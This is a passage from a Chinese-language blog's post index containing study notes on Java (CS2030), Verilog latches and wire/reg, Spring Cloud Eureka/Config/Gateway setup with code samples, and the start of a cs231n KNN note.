mapper.apply(str);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (tracer != <span class=\"literal\">null</span>) {</span><br><span class=\"line\">                tracer.accept(<span class=\"string\">\"traced map: \"</span> + result);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        });</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">flatMap</span><span class=\"params\">(Function&lt;String, Str&gt; mapper)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Str</span>(tracer -&gt; {</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">str</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getStr(tracer);</span><br><span class=\"line\">            <span class=\"type\">Str</span> <span class=\"variable\">mappedStr</span> <span class=\"operator\">=</span> mapper.apply(str);</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> mappedStr.getStr(tracer);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (tracer != <span class=\"literal\">null</span>) {</span><br><span class=\"line\">                tracer.accept(<span class=\"string\">\"traced flatMap: \"</span> + result);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        });</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">join</span><span class=\"params\">(Str other)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.flatMap(s1 -&gt; other.map(s2 -&gt; s1 + <span class=\"string\">\" \"</span> + s2));</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">join</span><span class=\"params\">(String other)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.map(s -&gt; s + other);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">trace</span><span class=\"params\">(Consumer&lt;String&gt; tracer)</span> {</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getStr(tracer);</span><br><span class=\"line\">        System.out.println(result);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">trace</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        trace(x -&gt; System.out.println(x));</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h1 id=\"附录\">附录</h1>\n<h2 id=\"extends-与-implements\">extends 与 implements</h2>\n<ul>\n<li><code>extends</code> 继承，父类和子类，抽象类也是类，用继承</li>\n<li><code>implements</code> 实现，接口和类，接口用实现</li>\n</ul>\n<h2 id=\"成员函数泛型\">成员函数泛型</h2>\n<p>成员函数的声明格式：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">[访问修饰符] [其他修饰符] [泛型参数] 返回类型 方法名(参数类型 参数名, ...) [<span class=\"keyword\">throws</span> 异常类型] {</span><br><span class=\"line\">    <span class=\"comment\">// 方法体</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>访问修饰符</strong>：public、private、protected</li>\n<li><strong>其他修饰符</strong>：\n<ul>\n<li>static（静态方法）</li>\n<li>final（最终方法，不能被子类重写）</li>\n<li>abstract（抽象方法，没有方法体）</li>\n</ul></li>\n<li><strong>泛型参数</strong>：用于声明方法独有的泛型参数（如果方法需要自己的泛型）。通常写在返回类型之前，例如\n<code>&lt;T&gt;</code>, <code>&lt;K, V&gt;</code> 等。</li>\n</ul>\n<p>静态方法，被静态调用的时候不能使用这个类的泛型！！必须要自己定义泛型参数。</p>\n<blockquote>\n<p>静态调用：直接使用 类名.方法名 ，而不是先创建对象。</p>\n</blockquote>\n","categories":["笔记"],"tags":["Java","CS2030"]},{"title":"新加坡国立 CS2030 期中模拟考讲解","url":"/CS2030/Mock/","content":"<p>模拟考试题讲解。</p>\n<span id=\"more\"></span>\n<h1 id=\"level-1\">Level 1</h1>\n","categories":["笔记"],"tags":["Java","CS2030"]},{"title":"Verilog 部分特性整理","url":"/HDL/verilog/","content":"<p>找老师问有什么东西可以给我先看起来，老师发来了Verilog……</p>\n<p>孽缘未了啊，这回重头认真学一学。</p>\n<p>记录一些之前没有考虑过的内容。</p>\n<p>参考这个网站https://hdlbits.01xz.net/</p>\n<span id=\"more\"></span>\n<h1 id=\"隐式声明\">隐式声明</h1>\n<p>通常变量需要使用 <code>wire</code> 或 <code>reg</code> 声明。</p>\n<p>但是也可以直接使用 <code>wire t = a &amp; b;</code>\n这样直接创建一个中间变量 <code>t</code> ，但是 <code>t</code>\n的宽度<strong>一定是1bit</strong>。</p>\n<p>这个在之前写CPU的时候错过无数遍了。</p>\n<h1 id=\"wire-和-reg\">wire 和 reg</h1>\n<blockquote>\n<p>A note on wire vs. reg: The left-hand-side of an assign statement\nmust be a <em>net</em> type (e.g., <code>wire</code>), while the\nleft-hand-side of a procedural assignment (in an always block) must be a\n<em>variable</em> type (e.g., <code>reg</code>). These types (wire vs.\nreg) have nothing to do with what hardware is synthesized, and is just\nsyntax left over from Verilog's use as a hardware <em>simulation</em>\nlanguage.</p>\n</blockquote>\n<p>其实没有本质区别。</p>\n<p>reg只能写在always里，wire只能写在外面通过assign或module连接。</p>\n<p>reg只是设计Verilog时的历史遗留问题。</p>\n<h1 id=\"避免锁存器\">避免锁存器</h1>\n<p>https://hdlbits.01xz.net/wiki/Always_if2</p>\n<blockquote>\n<p>一个常见的错误来源：如何避免生成锁存器（Latches）</p>\n<p>在设计电路时，你必须首先从电路的角度进行思考：</p>\n<ul>\n<li>我需要这个逻辑门</li>\n<li>我需要一个组合逻辑块，它有这些输入并产生这些输出</li>\n<li>我需要一个组合逻辑块，后面跟着一组触发器（flip-flops）</li>\n</ul>\n<p>你不能做的是：先写代码，然后希望它能生成一个合适的电路。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">If (cpu_overheated) then shut_off_computer = 1;</span><br><span class=\"line\">If (~arrived) then keep_driving = ~gas_tank_empty;</span><br></pre></td></tr></table></figure>\n<p>语法正确的代码不一定会生成合理的电路（组合逻辑 +\n触发器）。通常的问题是：\"在你未指定的情况下会发生什么？\"。Verilog\n的回答是：保持输出不变。</p>\n<p>这种“保持输出不变”的行为意味着当前状态需要被记住，因此会产生一个锁存器（latch）。组合逻辑（例如逻辑门）无法记住任何状态。要留意\n“Warning (10240): … inferring latch(es)”\n警告消息。除非锁存器是故意设计的，否则它几乎总是表示一个错误。组合电路必须在所有情况下对所有输出赋值。这通常意味着你需要使用\n<code>else</code> 子句或对输出赋予默认值。</p>\n</blockquote>\n<p>一个最重要的思路，写HDL和其他高级语言是非常不一样的两个体系。</p>\n<p>其他编程语言描述过程，HDL如其名描述<strong>硬件结构</strong>。</p>\n<p>不管是写什么代码，都是在告诉编译器生成一个什么样的硬件结构。</p>\n<p>这个问题就是如果不明确指明所有情况，则会产生锁存器，因为Verilog在没有指明的情况下会保持wire的输出不变。</p>\n<p>总之：<strong>当使用分支语句时必须覆盖所有情况。</strong></p>\n<hr>\n<p>后续遇到继续补充</p>\n","categories":["HDL"],"tags":["HDL","FPGA","学习笔记"]},{"title":"Spring Cloud - 注册中心、中央配置、网关","url":"/cloud-native/spring-cloud/","content":"<blockquote>\n<p>本文属于学习笔记，内容可能有误、可能不全面，仅代表个人在学习这一特性时的理解和总结</p>\n</blockquote>\n<p>实习第一天，主要目的是学习云原生架构。今天先从 Spring Cloud\n开始。</p>\n<figure>\n<img src=\"/cloud-native/spring-cloud/202408050942244.jpg\" alt=\"31722821596_.pic\">\n<figcaption aria-hidden=\"true\">31722821596_.pic</figcaption>\n</figure>\n<p>总的来说，Spring Boot 提供构建应用的基础，Spring Cloud\n在此基础上提供了分布式系统和微服务架构所需的工具和支持。</p>\n<span id=\"more\"></span>\n<h1 id=\"注册中心eureka\">1 注册中心（Eureka）</h1>\n<h2 id=\"eureka-名字由来\">1.1 Eureka 名字由来</h2>\n<p>“Eureka”是希腊语，意思是“我发现了！”</p>\n<p>源自经典的 <strong>阿基米德洗澡时发现浮力原理</strong> 小故事。</p>\n<blockquote>\n<p>阿基米德在洗澡时发现了证明王冠是否纯金的方法(黄金密度)，他激动地一边大喊“Eureka！”一边跳出澡盆奔去王宫，连衣服都忘了穿。后来人们用Eureka这个词来形容洞察浮现的瞬间。</p>\n</blockquote>\n<h2 id=\"网络架构\">1.2 网络架构</h2>\n<p>一个最简单的示例如下：</p>\n<figure>\n<img src=\"https://gitee.com/Cishoon/pic-bed/raw/master/202408051045349.png\" alt=\"image-20240805104516240\">\n<figcaption aria-hidden=\"true\">image-20240805104516240</figcaption>\n</figure>\n<p>要记住这个架构是一个微服务架构，将各个功能的实现分布式地部署在多个服务器中。每一个微服务都是独立的Springboot\nApp，分为以下三类：</p>\n<ol type=\"1\">\n<li><strong>Eureka Server（注册中心）</strong></li>\n<li><strong>Eureka Client（服务提供者）</strong></li>\n<li><strong>Eureka Client（服务消费者）</strong></li>\n</ol>\n<h3 id=\"注册中心\">1.2.1 注册中心</h3>\n<p><strong>注册中心</strong>是一个中央服务器，其他微服务都知道注册中心的Url。</p>\n<p>只需要增加配置，并在入口处增加 <code>@EnableEurekaServer</code>\n注解。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">    <span class=\"attr\">port:</span> <span class=\"number\">8761</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">eureka:</span></span><br><span class=\"line\">    <span class=\"attr\">client:</span></span><br><span class=\"line\">        <span class=\"attr\">register-with-eureka:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">        <span class=\"attr\">fetch-registry:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">    <span class=\"attr\">server:</span></span><br><span class=\"line\">        <span class=\"attr\">enable-self-preservation:</span> <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span></span><br><span class=\"line\"><span class=\"meta\">@EnableEurekaServer</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">EurekaServerApplication</span> {</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> {</span><br><span class=\"line\">        SpringApplication.run(EurekaServerApplication.class, args);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h3 id=\"服务提供者\">1.2.2 服务提供者</h3>\n<p><strong>服务提供者</strong>实现了一部分的 REST 接口，即实现\n<code>Controller</code>。在启动时会连接上注册中心，将他提供的接口注册到Eureka\nServer。可以有多个提供者提供相同的接口。</p>\n<p>服务提供者在配置文件中设置实例名称，以及注册中心的Url</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8081</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">application:</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">provider-service</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">eureka:</span></span><br><span class=\"line\">  <span class=\"attr\">client:</span></span><br><span class=\"line\">    <span class=\"attr\">service-url:</span></span><br><span class=\"line\">      <span class=\"attr\">defaultZone:</span> <span class=\"string\">http://localhost:8761/eureka/</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"服务消费者\">1.2.3 服务消费者</h3>\n<p><strong>服务消费者</strong>的工作流程：</p>\n<ul>\n<li>消费者发送请求 <code>http://provider-service/hello</code>。（这里的\n<code>provider-service</code>\n就是服务提供者设置的实例名称，<code>hello</code>\n是提供者已经实现的一个接口。）</li>\n<li><code>RestTemplate</code> 查询 Eureka 注册中心，获取\n<code>provider-service</code> 的所有实例地址。</li>\n<li>负载均衡器选择一个实例，将请求路由到该实例。</li>\n</ul>\n<p>代码实现是：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ConsumerController</span> {</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> RestTemplate restTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(\"/invoke\")</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">invokeProviderService</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> restTemplate.getForObject(<span class=\"string\">\"http://provider-service/hello\"</span>, String.class);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>在配置中设置 <code>RestTemplate</code> ，增加\n<code>@loadBalanced</code> 负载均衡注解：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AppConfig</span> {</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"meta\">@LoadBalanced</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> RestTemplate <span class=\"title function_\">restTemplate</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RestTemplate</span>();</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h4 id=\"resttemplate的简化\">RestTemplate的简化</h4>\n<blockquote>\n<p><code>RestTemplate</code> 是 Spring 提供的一个同步 HTTP\n客户端，用于简化与 RESTful\n服务的通信。它提供了多种便捷的方法，可以轻松地执行各种 HTTP 请求（如\nGET、POST、PUT、DELETE 等）并处理响应。<code>RestTemplate</code>\n可以自动处理请求和响应的序列化和反序列化，使得与 REST API\n的交互变得更加简洁和直观。</p>\n</blockquote>\n<p><code>@LoadBalanced</code> 注解是 Spring Cloud\n实现的，会自动完成以下步骤：</p>\n<ol type=\"1\">\n<li><strong>服务发现</strong>：从 Eureka\n注册中心获取指定服务的所有可用实例。</li>\n<li><strong>负载均衡</strong>：根据负载均衡策略（默认是轮询）选择一个实例。</li>\n<li><strong>请求转发</strong>：将请求转发到选择的实例。</li>\n</ol>\n<p>如果不使用 <code>@LoadBalance</code> 注解，完整的 <code>invoke</code>\n接口实现如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> cn.hutool.http.HttpUtil;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.cloud.client.ServiceInstance;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.cloud.client.discovery.DiscoveryClient;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Random;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ConsumerController</span> {</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> DiscoveryClient discoveryClient;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">Random</span> <span class=\"variable\">random</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(\"/invoke\")</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">invokeProviderService</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"comment\">// 获取 provider-service 的所有实例</span></span><br><span class=\"line\">        List&lt;ServiceInstance&gt; instances = discoveryClient.getInstances(<span class=\"string\">\"provider-service\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (instances == <span class=\"literal\">null</span> || instances.isEmpty()) {</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>(<span class=\"string\">\"No instances available for provider-service\"</span>);</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 随机选择一个实例（简单的负载均衡策略）</span></span><br><span class=\"line\">        <span class=\"type\">ServiceInstance</span> <span class=\"variable\">selectedInstance</span> <span class=\"operator\">=</span> instances.get(random.nextInt(instances.size()));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 构造服务URL</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> selectedInstance.getUri().toString() + <span class=\"string\">\"/hello\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 使用 Hutool 发送 HTTP 请求</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> HttpUtil.get(url);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h1 id=\"中央配置spring-cloud-config\">2 中央配置（Spring Cloud\nConfig）</h1>\n<p>原理差不多。中央配置与服务注册的逻辑是独立的，他们互不相关。</p>\n<p>也分为 <strong>config-client</strong> 和\n<strong>config-server</strong>.</p>\n<p>配置文件参考网上其他教程。</p>\n<hr>\n<p>我测试过程中遇到一个问题，client一直没有向 server\n发送获取配置的请求。</p>\n<p>原因：</p>\n<p><code>pom.xml</code> 中必须有以下配置（开始运行时获取配置）</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-starter-config<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>并且不能有 server 的依赖：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-config-server<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>我就是在client的 <code>pom.xml</code> 里不小心赋值进去了\n<code>config-server</code> 的依赖，导致一直没有获取配置。</p>\n<hr>\n<p>另外，有两个设计思路：</p>\n<ol type=\"1\">\n<li>config-client 连接 config-server，自动获取 config-server\n的注册中心</li>\n<li>设置注册中心，获取注册中心里的 config-server</li>\n</ol>\n<p>总之目的就是有一个统一的配置文件管理仓库，所有微服务启动时都能获取到最新的配置。</p>\n<h1 id=\"网关spring-cloud-gateway\">3 网关（Spring Cloud Gateway)</h1>\n<p>也是一个单独的应用。通过集成 Spring Cloud\nGateway，可以在微服务架构中实现集中路由和过滤功能。</p>\n<p>贴一下GPT的回答。</p>\n<h3 id=\"spring-cloud-gateway-简介\">Spring Cloud Gateway 简介</h3>\n<p>Spring Cloud Gateway 是一种基于 Spring Framework 5、Spring Boot 2 和\nProject Reactor 的 API\n网关，旨在为微服务架构提供路由、过滤、监控和安全功能。与 Zuul\n不同，Spring Cloud Gateway 使用非阻塞的 WebFlux\n框架，这使得它在处理高并发请求时更加高效。</p>\n<h3 id=\"集成-spring-cloud-gateway\">集成 Spring Cloud Gateway</h3>\n<h4 id=\"创建-spring-cloud-gateway-项目\">1. 创建 Spring Cloud Gateway\n项目</h4>\n<ol type=\"1\">\n<li><strong>创建一个新的 Spring Boot 项目</strong>。</li>\n<li><strong>添加依赖</strong>：</li>\n</ol>\n<p>在 <code>pom.xml</code> 中添加 Spring Cloud Gateway 和 Eureka Client\n的依赖：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"配置-gateway\">2. 配置 Gateway</h4>\n<p>在 <code>src/main/resources/application.yml</code> 中配置\nGateway：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8080</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">application:</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">gateway</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">eureka:</span></span><br><span class=\"line\">  <span class=\"attr\">client:</span></span><br><span class=\"line\">    <span class=\"attr\">service-url:</span></span><br><span class=\"line\">      <span class=\"attr\">defaultZone:</span> <span class=\"string\">http://localhost:8761/eureka/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">cloud:</span></span><br><span class=\"line\">    <span class=\"attr\">gateway:</span></span><br><span class=\"line\">      <span class=\"attr\">routes:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">id:</span> <span class=\"string\">provider-service</span></span><br><span class=\"line\">          <span class=\"attr\">uri:</span> <span class=\"string\">lb://provider-service</span></span><br><span class=\"line\">          <span class=\"attr\">predicates:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"string\">Path=/provider/**</span></span><br><span class=\"line\">          <span class=\"attr\">filters:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"string\">StripPrefix=1</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">id:</span> <span class=\"string\">consumer-service</span></span><br><span class=\"line\">          <span class=\"attr\">uri:</span> <span class=\"string\">lb://consumer-service</span></span><br><span class=\"line\">          <span class=\"attr\">predicates:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"string\">Path=/consumer/**</span></span><br><span class=\"line\">          <span class=\"attr\">filters:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"string\">StripPrefix=1</span></span><br></pre></td></tr></table></figure>\n<p>以上配置定义了两个路由： - <code>/provider/**</code>\n路径的请求将被转发到 <code>provider-service</code>。 -\n<code>/consumer/**</code> 路径的请求将被转发到\n<code>consumer-service</code>。</p>\n<p><code>StripPrefix=1</code> 表示在转发请求之前，将 URL 路径前缀\n<code>/provider</code> 或 <code>/consumer</code> 去掉。</p>\n<h4 id=\"启动类\">3. 启动类</h4>\n<p>在主类中添加 <code>@SpringBootApplication</code> 和\n<code>@EnableEurekaClient</code> 注解：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span></span><br><span class=\"line\"><span class=\"meta\">@EnableEurekaClient</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">GatewayApplication</span> {</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> {</span><br><span class=\"line\">        SpringApplication.run(GatewayApplication.class, args);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h3 id=\"启动和测试\">启动和测试</h3>\n<ol type=\"1\">\n<li><strong>启动 Eureka Server</strong>。</li>\n<li><strong>启动 Config Server</strong>。</li>\n<li><strong>启动多个服务提供者实例</strong>。</li>\n<li><strong>启动服务消费者</strong>。</li>\n<li><strong>启动 Gateway</strong>。</li>\n</ol>\n<h3 id=\"测试-gateway-路由\">测试 Gateway 路由</h3>\n<p>访问 Gateway 路由以测试：</p>\n<ol type=\"1\">\n<li><p>测试服务提供者： <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http://localhost:8080/provider/hello</span><br></pre></td></tr></table></figure> 或在浏览器中访问：\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://localhost:8080/provider/hello</span><br></pre></td></tr></table></figure></p></li>\n<li><p>测试服务消费者： <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http://localhost:8080/consumer/invoke</span><br></pre></td></tr></table></figure> 或在浏览器中访问：\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://localhost:8080/consumer/invoke</span><br></pre></td></tr></table></figure></p></li>\n</ol>\n<h3 id=\"总结\">总结</h3>\n<p>通过集成 Spring Cloud\nGateway，您可以在微服务架构中实现集中路由和过滤功能。它提供了强大的功能和灵活性，可以根据需要进行自定义和扩展。在上述配置中，我们实现了基本的服务路由，实际项目中可以根据需求增加更多的路由规则和过滤器。</p>\n<h1 id=\"总结-1\">总结</h1>\n<p>终于接触了微服务架构。初步了解了Spring\nCloud的框架。总之就是进一步的分布，进一步的解耦。</p>\n","categories":["笔记"],"tags":["实习，SpringCloud，微服务"]},{"title":"cs231n - KNN & SVM & Softmax","url":"/cs231n/01/","content":"<p>开个坑看cs231n的课，听说作业很精髓。</p>\n<p>之前学的太野了，东西都听过用过，但是甚至可能没对上名字，还是得听一遍课。</p>\n<p>笔记可能也记得比较野2333</p>\n<span id=\"more\"></span>\n<h1 id=\"图像分类\">图像分类</h1>\n<h2 id=\"k最临近\">K最临近</h2>\n<p>K Nearest Neighbor （KNN）</p>\n<p>太有误导性了，和CNN 